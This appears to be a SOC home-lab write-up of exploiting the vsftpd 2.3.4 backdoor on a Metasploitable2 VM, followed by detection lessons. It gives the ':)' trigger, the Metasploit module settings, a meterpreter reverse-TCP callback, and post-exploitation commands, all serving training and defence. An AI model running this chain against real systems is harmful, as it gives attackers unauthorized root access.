# Project 5 — End-to-End SOC Investigation: VSFTPD 2.3.4 Backdoor Exploitation

![Status](https://img.shields.io/badge/Status-Complete-brightgreen)
![Difficulty](https://img.shields.io/badge/Difficulty-Advanced-red)
![Tools](https://img.shields.io/badge/Tools-Kali%20%7C%20Metasploit%20%7C%20Meterpreter%20%7C%20Wireshark%20%7C%20tcpdump-red)

## 🎯 Objective

Chain together a full, realistic attack against a real historical vulnerability — reconnaissance → exploitation → root-level access — using Metasploit against the vsftpd 2.3.4 backdoor identified during Project 2's port scan. Correlate evidence across session, host, and network layers to build one complete incident timeline, rather than treating each layer as a standalone exercise.

---

## 🧠 What is the VSFTPD 2.3.4 Backdoor?

In 2011, the official vsftpd source archive was compromised and a malicious backdoor was inserted into the `vsftpd-2.3.4.tar.gz` release for a short window before it was discovered and removed. Metasploitable2 ships with this exact compromised version.

**How it works:** Sending a username containing a smiley face (`:)`) to the FTP service (port 21) silently triggers the backdoor, which opens a raw root shell listener on port 6200 — no credentials required.

**Why it matters:** This isn't a simulated vulnerability — it's a real, historically significant CVE (CVE-2011-2523) that gives an attacker **root**, not just user-level access, making it a far more severe finding than the reconnaissance (Project 2) or the manually-simulated netcat reverse shell (Project 3/4).

---

## 🖥️ Lab Environment

| Component | Details |
|-----------|---------|
| Attacker | Kali Linux (192.168.248.3) |
| Target | Metasploitable2 (192.168.248.4) |
| Network | Host-Only Adapter (192.168.248.0/24) |
| Exploitation Framework | Metasploit v6.4.135-dev |
| Exploit Module | `exploit/unix/ftp/vsftpd_234_backdoor` |
| Payload | `cmd/linux/http/x86/meterpreter_reverse_tcp` |
| Vulnerable Service | vsftpd 2.3.4 (port 21) |

---

## ⚔️ Attack Chain

### Phase 1: Confirm Target Still Vulnerable
```bash
ping -c 3 192.168.248.4
nmap -sV -p 21 192.168.248.4
```
**Result:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```
Confirmed the target was still running the exact vulnerable version identified in Project 2, before proceeding.

### Phase 2: Locate and Select the Exploit Module
```
msfconsole
search vsftpd
```
**Result:**
```
1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent  Yes  VSFTPD 2.3.4 Backdoor Command Execution
```
Selected based on: `Rank: excellent` (highest reliability tier) and exact version match (2.3.4), as opposed to the other match (`vsftpd_232`), which was only a Denial-of-Service auxiliary module for a different version.

```
info 1
use 1
```
Confirmed via `info` that the module is `Privileged: Yes` (grants elevated access) and `Check supported: Yes` (can verify vulnerability before exploiting).

### Phase 3: Configure the Module
```
set RHOSTS 192.168.248.4
set LHOST 192.168.248.3
show options
```
| Field | Value | Purpose |
|---|---|---|
| RHOSTS | 192.168.248.4 | Target to exploit |
| RPORT | 21 (default) | Port the backdoor trigger is sent to |
| LHOST | 192.168.248.3 | Attacker IP the payload calls back to |
| LPORT | 4444 (default) | Port on Kali receiving the callback |

### Phase 4: Verify Before Exploiting
```
check
```
**Result:**
```
[+] 192.168.248.4:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected; backdoor may be present
```

### Phase 5: Exploit
```
run
```
**First attempt result:**
```
[!] 192.168.248.4:21 - Unable to connect to backdoor on 6200/TCP. Cooldown?
[*] Exploit completed, but no session was created.
```
A known flaky characteristic of this specific module — the backdoor's activation window can be short-lived or inconsistent.

**Second attempt:** Failed differently — Metasploit detected port 6200 was already open (a residual side effect of attempt 1) and refused to proceed automatically as a safety check.

**Third attempt (forced):**
```
set ForceExploit true
run
```
**Result:**
```
[+] 192.168.248.4:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.248.3:4444 -> 192.168.248.4:40023) at 2026-07-28 21:35:29 -0400
meterpreter >
```
Full compromise achieved — backdoor triggered, root shell opened on port 6200, and Metasploit successfully escalated that access into a full meterpreter session calling back to Kali on port 4444.

---

## 🔍 Post-Exploitation Evidence Collection

### 1. Confirm privilege level
```
getuid
```
**Result:** `root`

A significant escalation compared to Project 3/4's netcat reverse shell, which only granted `msfadmin` (user-level) access. This module grants the highest possible privilege on the system.

### 2. Confirm target identity and OS
```
sysinfo
```
**Result:**
```
Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture : i686
```

### 3. Network visibility from inside the target
```
ipconfig
```
**Result (relevant excerpt):**
```
Interface 2 — eth0: 192.168.248.4 (known network)
Interface 3 — eth1: no IPv4 address assigned, MAC 08:00:27:8b:3e:67
```
**Notable finding:** A second network interface exists with no IP shown on the segment we've been operating in — indicating the compromised host may have visibility into a network segment not reachable from the attacker's original position. This is a classic **lateral movement** opportunity a real attacker would pursue next.

### 4. Running processes
```
ps
```
Confirmed all critical services flagged in Project 2's port scan are genuinely running: `sshd`, `apache2`, `snmpd`, and notably `unrealircd` — the **second known-backdoored service** (CVE-2010-2075) identified in Project 2, confirmed live but not yet exploited in this lab.

**Most significant finding:** a process named `mvJBVNMpG`, running as `root`, executing from an unusual top-level path (`/mvJBVNMpG`). This is the meterpreter payload binary itself, fetched and executed as part of the exploit chain (Metasploit's `FETCH_FILENAME` option generates a random filename like this by default). From a defender's perspective, this is exactly the kind of anomaly — unrecognized binary name, root privilege, non-standard path, no matching legitimate service — that should be immediately flagged during process-list review.

### 5. Network connection evidence
```
netstat -antp
```
**Key lines:**
```
tcp  192.168.248.4:40023  192.168.248.3:4444   ESTABLISHED   ← Active meterpreter session
tcp  192.168.248.4:6200   192.168.248.3:37088  ESTABLISHED   ← Original backdoor shell (still alive underneath)
tcp  192.168.248.4:6200   192.168.248.3:46773  CLOSE_WAIT    ← Leftover from a manual netcat connection attempt to the same backdoor
```

---

## 🚩 Three-Layer Evidence Correlation

| Layer | Evidence | What It Proves |
|---|---|---|
| **Session** | `getuid` → `root` | Successful privilege escalation to the highest level |
| **Host** | `ps` → unrecognized root process `mvJBVNMpG` | The payload artifact is visible directly on the compromised system |
| **Network** | `netstat` → established connections on ports 6200 and 4444 | The literal network communication channels backing the compromise are observable and correlate with the host/session evidence |

This three-layer correlation is the core lesson of this project: a real SOC investigation doesn't rely on a single log source — it triangulates across session activity, host artifacts, and network traffic to build a complete, corroborated picture.

---

## 📦 Packet Capture

A packet capture (`soc_investigation.pcap`) was collected via tcpdump on Kali's `eth0` interface, covering the FTP trigger (port 21), backdoor shell (port 6200), and meterpreter tunnel (port 4444) traffic.

*Detailed packet-level analysis of this capture (byte patterns distinguishing meterpreter's binary/encrypted traffic from Project 3's plaintext netcat shell) is a recommended follow-up analysis — noted here as a natural extension of this project.*

---

## 🧠 Key Concepts Learned

**Real Exploits vs. Simulated Access**
Unlike Project 3/4's manually-triggered netcat shell, this project used a genuine historical CVE and Metasploit's actual exploitation framework — closer to how real penetration testing and real attacks unfold, including realistic flakiness (the "cooldown" failures) that doesn't show up in a clean tutorial.

**Exploit vs. Payload**
The exploit (`vsftpd_234_backdoor`) is what breaks in; the payload (`meterpreter_reverse_tcp`) is what you get once you're in. Metasploit separates these deliberately, allowing the same vulnerability to be paired with different post-exploitation outcomes.

**Privilege Escalation Matters**
Root access (this project) represents a fundamentally more severe compromise than user-level access (Project 3/4) — full read/write/execute control of the system, versus a constrained account.

**Process Lists as Detection Evidence**
An attacker's payload doesn't just live in network traffic — it runs as an actual process on the compromised host, often with a suspicious, unfamiliar name. Host-based monitoring (or even a manually reviewed `ps` output) is a critical, independent detection layer alongside network monitoring.

---

## ⚠️ Issues Faced & Fixed

| Issue | Root Cause | Fix |
|-------|-----------|-----|
| `set payload cmd/unix/interact` rejected | Payload name doesn't exist in this Metasploit version/module | Used `show payloads` to list actual compatible payloads instead of guessing a name |
| First `run` failed with "Cooldown?" error | Known flaky behavior of this specific backdoor — activation window can be short-lived | Simply retried |
| Second `run` failed — "port 6200 already in use" | The first attempt actually succeeded in opening the backdoor, but nothing consumed the shell, leaving it open and confusing Metasploit's pre-check | Used `set ForceExploit true` to bypass the check and retrigger |
| Manual `nc 192.168.248.4 6200` appeared to hang | Metasploit's own automated flow consumed the port 6200 shell to bootstrap meterpreter before the manual netcat connection could fully establish | Not a real issue — meterpreter session succeeded via the automated path instead |

---

## 📈 Detection Quality Assessment

| Metric | Value |
|--------|-------|
| Privilege Achieved | root (full system compromise) |
| Session Type | Meterpreter (upgraded from raw shell) |
| Evidence Layers Correlated | 3 (session, host, network) |
| Anomalous Process Identified | Yes (`mvJBVNMpG`, root, non-standard path) |
| Established Network Connections Identified | 2 (port 6200 backdoor, port 4444 meterpreter tunnel) |
| Detection Method | Manual post-exploitation review (no SIEM ingestion for this attack class yet) |

---

## 🔧 Recommended Improvements

- **Patch/remove vsftpd 2.3.4 immediately** — this is a critical, actively backdoored version with no legitimate reason to remain in service.
- **Host-based monitoring (auditd/EDR):** Alert on newly spawned processes running as root from non-standard paths (e.g., `/mvJBVNMpG`-style random top-level filenames) — this would have caught the payload the moment it executed.
- **Network-layer detection:** Alert on any successful connection to port 6200, which has no legitimate business purpose on this host.
- **Egress filtering:** The meterpreter callback to port 4444 relies on unrestricted outbound access — blocking non-essential outbound connections would have prevented the session from establishing even after the backdoor triggered.
- **Splunk integration:** None of this attack chain was visible in the current Splunk pipeline — forwarding auditd and Zeek/conn-log telemetry (as recommended in Project 3/4) would close this visibility gap for future incidents of this class.

---

## ➡️ Next Project

Continue building out network-layer detection (Zeek/Suricata) and host-layer telemetry (auditd → Splunk) to close the SIEM visibility gap identified across this and prior projects — turning today's manual post-exploitation review into an automated, real-time detection pipeline.

---

*Lab conducted as part of SOC Home Lab training — simulated environment only*
*Analyst: Sreelakshmi Chandran | github.com/Leee-bit*
